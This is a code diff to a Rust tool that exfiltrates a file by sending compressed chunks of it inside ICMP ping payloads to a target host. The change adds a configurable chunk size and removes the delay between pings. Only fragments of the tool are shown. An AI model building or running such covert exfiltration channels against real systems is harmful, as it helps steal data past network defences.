@@ -20,9 +20,11 @@ pub struct Cli {
 
     /// Path to the file to exfiltrate
     file_path: String,
-}
 
-const CHUNK_SIZE: usize = 2usize.pow(14);
+    /// Size of the chunks
+    #[clap(long, default_value_t = 1480)]
+    chunk_size: usize,
+}
 
 #[tokio::main]
 async fn main() -> Result<(), String> {
@@ -77,7 +79,7 @@ async fn main() -> Result<(), String> {
     sleep(Duration::from_secs(1)).await;
 
     // the chunk size is because of the max payload size of ping
-    for chunk in compressed.chunks(CHUNK_SIZE) {
+    for chunk in compressed.chunks(cli.chunk_size) {
         let data = Messages::Data {
             data: chunk.to_vec(),
             identifier,
@@ -88,11 +90,9 @@ async fn main() -> Result<(), String> {
         client
             .pinger(target, PingIdentifier(1337))
             .await
-            .send_ping(PingSequence(identifier), &serialized)
+            .ping(PingSequence(identifier), &serialized)
             .await
             .map_err(|e| format!("Could not send ping: {e}"))?;
-
-        sleep(Duration::from_millis(50)).await;
     }
 
     let eot = Messages::EndOfTransmission { identifier };
